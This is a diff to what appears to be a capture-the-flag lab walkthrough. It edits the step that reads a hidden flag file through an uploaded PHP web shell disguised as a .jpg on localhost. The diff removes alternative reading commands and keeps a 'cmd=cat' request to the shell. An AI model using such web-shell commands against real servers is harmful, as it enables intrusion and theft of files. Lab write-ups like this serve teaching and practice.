@@ -129,13 +129,8 @@ This step involves exploring the server's file system to locate and retrieve the
 3. **Reading the Flag File**
    - Multiple methods to read the flag content:
    ```
-   # Using cat (primary method)
+   # Using cat
    http://localhost:8080/uploads/shell.php.jpg?cmd=cat /var/hidden/level1/level2/secret_flag.txt
-   
-   # Alternative reading methods if cat is blocked
-   http://localhost:8080/uploads/shell.php.jpg?cmd=head -n 1 /var/hidden/level1/level2/secret_flag.txt
-   http://localhost:8080/uploads/shell.php.jpg?cmd=more /var/hidden/level1/level2/secret_flag.txt
-   http://localhost:8080/uploads/shell.php.jpg?cmd=less /var/hidden/level1/level2/secret_flag.txt
    ```
 
 ## Available Hints
